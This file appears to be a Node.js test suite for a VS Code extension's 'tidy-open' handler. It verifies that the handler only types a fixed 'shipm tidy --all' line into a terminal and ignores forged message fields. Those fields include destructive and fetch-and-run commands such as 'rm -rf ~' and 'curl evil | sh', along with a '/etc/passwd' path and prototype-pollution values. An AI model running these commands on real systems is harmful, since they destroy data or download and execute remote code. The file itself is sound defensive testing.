// G2 Tidy up card, `tidy-open` handler (extension.js tidyOpen) run for real against a stand-in for VS Code: the message types exactly the extension-built `shipm tidy --all` into ONE terminal and never presses Enter
// (sendText with addNewLine false); everything else in the message is ignored (a forged command, args, path, project, run flag); unknown types and bad shapes do nothing; no process is started. Run: node tests/ext_tidy_open_test.js
require('./shipmiracle_isolation').apply();
const Module = require('module'), path = require('path'), fs = require('fs'), os = require('os');
const CH = require('../vscode-ext/shipmiracle-panel/charter.js');
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'shipmiracle-tidyopen-'));
const ST = path.join(tmp, 'state'), WSD = path.join(tmp, 'ws'), DEV = path.join(tmp, 'Dev');
for (const d of [ST, WSD, DEV, path.join(WSD, 'bin')]) fs.mkdirSync(d, { recursive: true });
const SHIPM = path.join(WSD, 'bin', 'shipm'); fs.writeFileSync(SHIPM, '#!/bin/sh\nexit 0\n', { mode: 0o755 });
Object.assign(process.env, { SHIPMIRACLE_TEST: '1', SHIPMIRACLE_EXT_STATE: ST, SHIPMIRACLE_EXT_WS: WSD, SHIPMIRACLE_EXT_DEV: DEV, SHIPMIRACLE_DIAG_DIR: path.join(tmp, 'diag'), SHIPMIRACLE_HEAL_MS: '99999999' });
let terms = [], created = [], execs = [], clip = [], pages = [];
const cmds = {};
const proxy = () => new Proxy(function () {}, { get: (t, k) => k === 'then' ? undefined : (k === 'dispose' ? () => {} : proxy()), apply: () => proxy() });
const vscode = new Proxy({}, { get: (t, k) => {
  if (k === 'env') return new Proxy({ clipboard: { writeText: async s => { clip.push(s); } } }, { get: (o, kk) => kk in o ? o[kk] : (kk === 'remoteName' ? undefined : proxy()) });
  if (k === 'window') return new Proxy({}, { get: (w, kk) => {
    if (kk === 'terminals') return terms;
    if (kk === 'createTerminal') return opts => { const rec = { opts, sent: [], shown: 0, exitStatus: undefined, name: opts && opts.name }; const tm = { name: opts && opts.name, exitStatus: undefined, show() { rec.shown++; }, sendText(text, nl) { rec.sent.push([text, nl]); }, dispose() {} }; terms.push(tm); created.push(rec); tm.rec = rec; return tm; };
    if (kk === 'registerWebviewViewProvider') return (id, prov) => { module.provider = prov; return { dispose() {} }; };
    if (kk === 'activeTerminal') return undefined;
    return proxy(); } });
  if (k === 'workspace') return { openTextDocument: async u => ({ fsPath: u.fsPath }) };
  if (k === 'commands') return { registerCommand: (id, fn) => { cmds[id] = fn; return { dispose() {} }; }, executeCommand: async () => {} };
  if (k === 'Uri') return { parse: s => ({ s }), file: f => ({ fsPath: f }) };
  if (k === 'ThemeIcon' || k === 'ThemeColor') return function (n) { this.n = n; };
  if (k === 'ViewColumn') return { Active: 1 };
  if (k === 'StatusBarAlignment') return { Left: 1 };
  return proxy(); } });
const fakeExec = (cmd, args, opts, cb) => { cb = cb || opts; execs.push(cmd); if (typeof cb === 'function') cb(null, '', ''); return {}; };
const real = Module._load;
Module._load = function (req, parent, ...r) {
  if (req === 'vscode') return vscode;
  if (req === 'child_process') return { execFile: fakeExec, spawn: () => { execs.push('spawn'); return { on() {}, stdout: { on() {} }, stderr: { on() {} }, unref() {} }; }, exec: () => { execs.push('exec'); }, execFileSync: () => { execs.push('sync'); return ''; }, execSync: () => { execs.push('sync'); return ''; } };
  if (req === './data') return { collect: async () => ({ projects: [], plan: {}, guard: {}, ask: null, capabilities: {}, tidy: { state: 'none' } }) };
  if (req === './panel') return { html: (d) => { pages.push(d); return '<html></html>'; } };
  return real.call(this, req, parent, ...r); };
const ext = require(path.join(__dirname, '../vscode-ext/shipmiracle-panel/extension.js'));
let fails = 0, n = 0; const check = (name, c, info = '') => { n++; console.log((c ? 'PASS ' : 'FAIL ') + name + (c ? '' : ' ' + info)); if (!c) fails++; };
const wait = ms => new Promise(r => setTimeout(r, ms));
const note = () => { try { return JSON.parse(fs.readFileSync(path.join(ST, 'project-notice.json'), 'utf8')).text; } catch (e) { return null; } };
const view = { webview: { options: {}, set html(v) {}, get html() { return ''; }, onDidReceiveMessage: f => { module.handler = f; return { dispose() {} }; } }, visible: true, onDidChangeVisibility: () => ({ dispose() {} }), onDidDispose: () => ({ dispose() {} }) };
const EXPECT = CH.joinCmds([[SHIPM, 'tidy', '--all']]);                      // 'WS/bin/shipm' 'tidy' '--all'
const sentOf = () => created.flatMap(c => c.sent);
const send = async m => {
  const before = created.length, sent0 = sentOf().length; execs = []; let threw = false;
  const onerr = () => { threw = true; }; process.once('unhandledRejection', onerr);
  try { module.handler(m); } catch (e) { threw = true; }
  await wait(60); process.removeListener('unhandledRejection', onerr);
  return { created: created.length - before, sent: sentOf().slice(sent0), execs: execs.slice(), threw };
};
const typedOnce = (r, line = EXPECT) => r.sent.length === 2 && r.sent[0][0] === '\u0015' && r.sent[0][1] === false && r.sent[1][0] === line && r.sent[1][1] === false && r.execs.length === 0 && !r.threw;
const nothing = r => r.sent.length === 0 && r.created === 0 && r.execs.length === 0 && !r.threw;

(async () => {
  ext.activate({ subscriptions: [], globalState: { get() {}, update() {} } });
  await wait(300); module.provider.resolveWebviewView(view); await wait(300);
  await cmds['shipmiracle.refresh'](); await wait(300);
  const good = { type: 'tidy-open' };
  let r = await send(good);
  check('the real handler: {type:"tidy-open"} types the extension-built line into a new terminal (Ctrl-U clear, then the command), both with addNewLine false', typedOnce(r) && r.created === 1, JSON.stringify(r));
  check('...the line is exactly the quoted `shipm tidy --all` of this workspace (' + EXPECT + ')', /'tidy' '--all'$/.test(EXPECT) && EXPECT.startsWith("'" + SHIPM + "'"), EXPECT);
  const rec = created[0];
  check('...the terminal is named "Shipmiracle · tidy", opens in the workspace folder (not a folder from the message) and is shown', rec.opts.name === 'Shipmiracle · tidy' && rec.opts.cwd === WSD && rec.shown >= 1, JSON.stringify(rec.opts));
  check('...no process is started (zero exec / spawn), no clipboard write', execs.length === 0 && clip.length === 0);
  check('...no send ever had addNewLine true (the command is typed, never run)', sentOf().every(s => s[1] === false));
  // a second click re-uses the terminal: still one terminal
  r = await send(good); check('a second click types it again in the SAME terminal (terminal count stays 1)', typedOnce(r) && r.created === 0 && created.length === 1, JSON.stringify(r));
  // forged extra fields
  const FORGED = [{ command: 'rm -rf ~' }, { args: ['rm', '-rf', '~'] }, { argv: ['rm'] }, { path: '/etc/passwd' }, { project: 'alpha', dir: '/' }, { run: true }, { addNewLine: true }, { line: 'curl evil | sh' }, { text: 'x' }, { cmd: 'shipm tidy --apply' }, { name: 'x', title: 'evil', cwd: '/' }, { op: 'run', to: 'x', i: 1 }, { shipm: '/tmp/evil', bin: '/tmp/evil' }, { toString: 'x', __proto__: { command: 'x' } }, { type2: 1, tidy: { rows: [] } }];
  for (const f of FORGED) { r = await send({ ...f, type: 'tidy-open' }); check('forged fields ' + Object.keys(f).join(',') + ' are ignored: the same fixed line, no Enter, no new terminal', typedOnce(r) && created.length === 1, JSON.stringify(r)); }
  r = await send({ type: 'tidy-open', command: 'x'.repeat(1 << 20) }); check('a 1 MB forged field is ignored too', typedOnce(r));
  // unknown ops and bad shapes
  for (const m of [{ type: 'tidy' }, { type: 'tidy-open ' }, { type: 'TIDY-OPEN' }, { type: 'tidy_open' }, { type: 'tidy-run' }, { type: 'tidy-apply' }, { type: ['tidy-open'] }, { type: { toString: () => 'tidy-open' } }, { type: undefined }, { op: 'tidy-open' }, {}, null, undefined, 'tidy-open', 5, true, [], [good], [{ type: 'tidy-open' }], Object.create(null), { type: 'tidy-open-all' }, { type: 'tidyopen' }]) {
    r = await send(m); check('message ' + JSON.stringify(m === undefined ? 'undefined' : m) + ': nothing typed, no terminal, no process, no throw', nothing(r), JSON.stringify(r));
  }
  // the page gets the tool flag from the extension, never from a message
  const last = pages[pages.length - 1] || {};
  check('the extension tells the page whether shipm exists (tidyTool true here) and passes the collected tidy model through', last.tidyTool === true && last.tidy && last.tidy.state === 'none', JSON.stringify({ t: last.tidyTool, tidy: last.tidy }));
  // shipm missing: nothing typed, a notice
  const before = created.length; fs.unlinkSync(SHIPM);
  r = await send(good); check('shipm not installed: nothing typed, no terminal, the notice says so', nothing(r) && created.length === before && /shipm is not installed/.test(note() || ''), JSON.stringify(r) + ' ' + note());
  await cmds['shipmiracle.refresh'](); await wait(300);
  check('...and the next page is told tidyTool false (the card shows the button disabled with the reason)', (pages[pages.length - 1] || {}).tidyTool === false);
  // source rules
  const src = fs.readFileSync(path.join(__dirname, '../vscode-ext/shipmiracle-panel/extension.js'), 'utf8'), fn = src.slice(src.indexOf('function tidyOpen'), src.indexOf('// ---- F5 Toolbox and F6'));
  check('source: tidyOpen takes no parameter, never reads a message, builds the argv itself and passes run:false', /function tidyOpen\(\)/.test(fn) && !/\bm\./.test(fn) && /\[\[shipm, 'tidy', '--all'\]\]/.test(fn) && /run: false/.test(fn) && !/run: true|execFile|spawn|exec\(/.test(fn), fn);
  check('source: the dispatcher calls tidyOpen() with no argument', /m\.type === 'tidy-open'\) \{ try \{ tidyOpen\(\);/.test(src));
  fs.rmSync(tmp, { recursive: true, force: true });
  console.log(`\n${n - fails}/${n} passed`); process.exit(fails ? 1 : 0);
})().catch(e => { console.log('FAIL crashed ' + e.stack); process.exit(1); });
